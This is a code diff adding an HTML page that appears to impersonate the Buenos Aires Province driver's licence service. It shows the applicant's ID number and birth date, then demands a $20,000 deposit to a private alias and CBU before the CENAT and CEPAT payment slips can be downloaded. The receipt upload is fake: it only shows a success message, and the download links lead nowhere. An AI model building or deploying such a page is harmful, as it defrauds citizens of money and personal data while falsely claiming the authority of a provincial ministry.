@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boletas Generadas</title>
+    <link rel="stylesheet" href="style2.css">
+</head>
+<body>
+
+    <header class="page2-header">
+        <div class="logo-area">
+            <h1>LICENCIASBA</h1>
+            <img src="images/licencias22.png" alt="Logo Licencias" class="logo-ba">
+        </div>
+        
+        <div class="header-blue-bar">
+            <span>Bienvenido</span>
+        </div>
+    </header>
+
+    <div class="page2-container">
+        <main class="page2-main-content">
+            <div class="title-row">
+                <h2>LICENCIAS</h2>
+                <a href="licencias.html" class="volver-button">VOLVER</a>
+            </div>
+            <p class="subtitle">BOLETAS</p>
+
+            <div class="obtain-boleta-section">
+                <span class="icon-check">✓</span>
+                Obtener CENAT y CEPAT
+            </div>
+
+            <div class="boletas-info-container">
+                <p class="applicant-name" id="nombre-boleta"></p>
+                <p class="applicant-data" id="datos-boleta"></p>
+                <div class="download-buttons-container">
+                    <a href="#" class="boleta-button boleta-cenat">1° - BOLETA CENAT</a>
+                    <a href="#" class="boleta-button boleta-cepat">2° - BOLETA CEPAT</a>
+                </div>
+            </div>
+            <div class="transfer-info" style="font-size: 14px; font-family: Arial, sans-serif;">
+                <p><strong>Por favor, realice el depósito correspondiente de $20,000 para completar la descarga de las boletas.</strong></p>
+                <p><strong>Alias:</strong> registro.mg.com.ar</p>
+                <p><strong>CBU:</strong> 0000184305010025590764</p>
+                <label for="comprobante">Suba aquí su comprobante de pago:</label>
+                <input type="file" id="comprobante" name="comprobante" accept="image/*">
+                <button id="accept-button" style="display: none; margin-top: 10px; padding: 5px 10px; font-size: 12px;">Aceptar</button>
+                <p id="success-message" style="display: none; color: green; font-weight: bold;">¡El comprobante ha sido subido con éxito! Ya puede descargar las boletas.</p>
+            </div>
+            <script>
+            // Leer datos del localStorage y mostrarlos
+            const nombre = localStorage.getItem('licencias_nombre') || '';
+            const documento = localStorage.getItem('licencias_documento') || '';
+            const fechaNacimiento = localStorage.getItem('licencias_fechaNacimiento') || '';
+            document.getElementById('nombre-boleta').textContent = nombre ? nombre : 'Nombre no ingresado';
+            document.getElementById('datos-boleta').textContent = (documento || fechaNacimiento) ? `Número de documento: ${documento} | Fecha de nacimiento: ${fechaNacimiento}` : '';
+            </script>
+
+            <script>
+                document.getElementById('comprobante').addEventListener('change', function() {
+                    const acceptButton = document.getElementById('accept-button');
+                    acceptButton.style.display = 'inline-block';
+                });
+
+                document.getElementById('accept-button').addEventListener('click', function() {
+                    const successMessage = document.getElementById('success-message');
+                    successMessage.style.display = 'block';
+                });
+            </script>
+
+            <div class="important-warning">
+                <span class="icon-warning">⚠️</span>
+                <div>
+                    <p><strong>Importante</strong></p>
+                    <p>Si tenés inconvenientes para descargar las boletas o cometiste un error al generar las mismas, deberás ponerte en contacto con tu Centro de Emisión de Licencias.</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <footer class="page2-footer">
+        LICENCIAS BA
+        <p>Ministerio de Infraestructura y Servicios Públicos | Dirección Provincial de Política y Seguridad Vial | Buenos Aires Provincia</p>
+    </footer>
+</body>
+</html>
